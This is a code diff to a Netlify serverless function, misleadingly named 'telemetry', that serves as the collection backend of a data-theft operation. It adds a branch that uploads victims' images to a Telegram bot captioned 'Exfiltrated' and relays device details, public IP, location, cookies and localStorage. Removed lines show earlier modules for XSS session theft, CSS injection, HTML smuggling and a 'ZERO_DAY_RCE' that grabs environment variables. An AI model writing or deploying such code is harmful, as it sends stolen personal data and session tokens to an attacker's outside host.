@@ -1,4 +1,4 @@
-// netlify/functions/telemetry.js – FIXED: Correct env var names
+// netlify/functions/telemetry.js – Handles both JSON telemetry and image uploads
 exports.handler = async (event, context) => {
   // CORS preflight
   if (event.httpMethod === 'OPTIONS') {
@@ -22,7 +22,6 @@ exports.handler = async (event, context) => {
     };
   }
 
-  // CORRECT ENV VAR NAMES (as per your screenshot)
   const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
   const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -46,8 +45,46 @@ exports.handler = async (event, context) => {
     };
   }
 
-  const msg = formatTelegramMessage(payload);
+  const module = payload.module || 'UNKNOWN';
 
+  // SPECIAL HANDLING FOR IMAGE EXFIL (Base64 data)
+  if (module === 'IMAGE_EXFIL' && payload.data) {
+    // Send the image as a photo to Telegram
+    try {
+      // Convert base64 to buffer
+      const base64Data = payload.data.split(',')[1] || payload.data;
+      const imageBuffer = Buffer.from(base64Data, 'base64');
+
+      // Use form-data to upload
+      const FormData = require('form-data');
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', imageBuffer, {
+        filename: payload.filename || 'image.jpg',
+        contentType: payload.type || 'image/jpeg',
+      });
+      form.append('caption', `📸 Exfiltrated: ${payload.filename || 'image'} (${Math.round(payload.size/1024)}KB)`);
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const resp = await fetch(url, {
+        method: 'POST',
+        body: form,
+        headers: form.getHeaders(),
+      });
+      const result = await resp.json();
+      if (!result.ok) {
+        console.error('Telegram photo upload error:', result);
+        return { statusCode: 500, headers: { 'Access-Control-Allow-Origin': '*' }, body: 'Telegram photo upload failed' };
+      }
+      return { statusCode: 200, headers: { 'Access-Control-Allow-Origin': '*' }, body: 'Photo sent' };
+    } catch (err) {
+      console.error('Error uploading photo:', err);
+      return { statusCode: 500, headers: { 'Access-Control-Allow-Origin': '*' }, body: 'Photo upload error' };
+    }
+  }
+
+  // For other modules, send as text message
+  const msg = formatTelegramMessage(payload);
   try {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     const resp = await fetch(url, {
@@ -90,34 +127,25 @@ function formatTelegramMessage(data) {
   lines.push(`🔴 <b>[${module}]</b>`);
   lines.push(`⏱ ${data.timestamp || new Date().toISOString()}`);
 
-  if (module === 'HTML_SMUGGLING' || module === 'IMAGE_DROPPER_DELIVERED' || module === 'IMAGE_DROPPER_ERROR') {
-    lines.push(`📁 File: ${data.filename || 'N/A'}`);
-    lines.push(`📦 Size: ${data.size || 'N/A'}`);
-    lines.push(`🚦 Status: ${data.status || 'N/A'}`);
-    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
+  if (module === 'IMAGE_SUMMARY') {
+    lines.push(`📊 Total images found: ${data.total || 0}`);
+    lines.push(`📤 Sent: ${data.sent || 0}`);
+    lines.push(`📁 Paths: ${(data.paths || []).join(', ')}`);
   } 
-  else if (module === 'CSS_INJECTION') {
-    lines.push(`🎨 Vector: ${data.technique || 'Selector attack'}`);
-    lines.push(`📋 Exfiltrated: ${data.exfiltrated_data || 'N/A'}`);
-    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
-  } 
-  else if (module === 'CORS_MISCONFIG') {
-    lines.push(`🌐 Status: ${data.status || 'N/A'}`);
-    lines.push(`📦 Sample: ${JSON.stringify(data.data_sample || {}).substring(0, 200)}`);
-    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
-  } 
-  else if (module === 'XSS_SESSION_STEAL' || module === 'AUTO_TELEMETRY' || module === 'IMAGE_DROPPER_PAYLOAD') {
-    lines.push(`🍪 Cookies: ${data.storage?.cookies || data.cookies || 'N/A'}`);
-    lines.push(`📦 LocalStorage: ${JSON.stringify(data.storage?.localStorage || data.localStorage || {}).substring(0, 150)}`);
-    lines.push(`📦 SessionStorage: ${JSON.stringify(data.storage?.sessionStorage || data.sessionStorage || {}).substring(0, 150)}`);
-    lines.push(`📍 Origin: ${data.origin || data.pageUrl || 'N/A'}`);
-    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
-  } 
-  else if (module === 'ZERO_DAY_RCE') {
-    lines.push(`💀 Status: ${data.status || 'Executed'}`);
-    lines.push(`⚡ Electron: ${data.isElectron ? 'YES (Desktop app)' : 'NO (Browser)'}`);
-    lines.push(`🔧 Env: ${JSON.stringify(data.environment_variables || {}).substring(0, 100)}`);
-    if (data.error) lines.push(`⚠️ Error: ${data.error}`);
+  else if (module === 'GALLERY_PAGE_TELEMETRY') {
+    const dev = data.device || {};
+    lines.push(`📱 Device: ${dev.userAgent || 'N/A'}`);
+    lines.push(`🖥 Screen: ${dev.screen || 'N/A'}`);
+    lines.push(`🌍 Timezone: ${dev.timezone || 'N/A'}`);
+    lines.push(`🔗 Referrer: ${data.referrer || 'N/A'}`);
+  }
+  else if (module === 'AUTO_TELEMETRY') {
+    lines.push(`📱 Device: ${data.device?.userAgent || 'N/A'}`);
+    lines.push(`🖥 Screen: ${data.device?.screen || 'N/A'}`);
+    lines.push(`🌐 IP: ${data.network?.publicIP || 'N/A'}`);
+    lines.push(`📍 Location: ${data.network?.approxLocation?.city || 'N/A'}, ${data.network?.approxLocation?.country || 'N/A'}`);
+    lines.push(`🍪 Cookies: ${data.storage?.cookies || 'N/A'}`);
+    lines.push(`📦 LocalStorage: ${JSON.stringify(data.storage?.localStorage || {}).substring(0, 100)}`);
   } 
   else {
     lines.push(`📦 Payload: ${JSON.stringify(data).substring(0, 300)}`);
